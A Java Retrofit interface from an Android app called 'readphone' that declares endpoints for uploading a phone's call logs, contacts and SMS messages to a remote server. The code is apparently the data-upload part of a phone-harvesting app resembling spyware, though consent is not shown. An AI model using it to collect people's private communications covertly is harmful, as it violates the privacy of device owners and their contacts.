package com.example.apple.readphone;

import com.example.apple.readphone.models.CallLogModel;
import com.example.apple.readphone.models.PhoneContactModel;
import com.example.apple.readphone.models.SmsModel;

import java.util.List;

import retrofit2.Call;
import retrofit2.http.Body;
import retrofit2.http.Header;
import retrofit2.http.Headers;
import retrofit2.http.POST;

public interface Api {


    @POST("/retrieveCallLogs")
    Call<List<CallLogModel>> sendCallLog(@Header("sender") String sender ,@Body List<CallLogModel> calls);


    @POST("/retrieveContacts")
    Call<List<PhoneContactModel>> sendContacts(@Header("sender") String sender ,@Body List<PhoneContactModel> calls);


    @POST("/retrieveSms")
    Call<List<SmsModel>> sendAllSms(@Header("sender") String sender ,@Body List<SmsModel> calls);
}
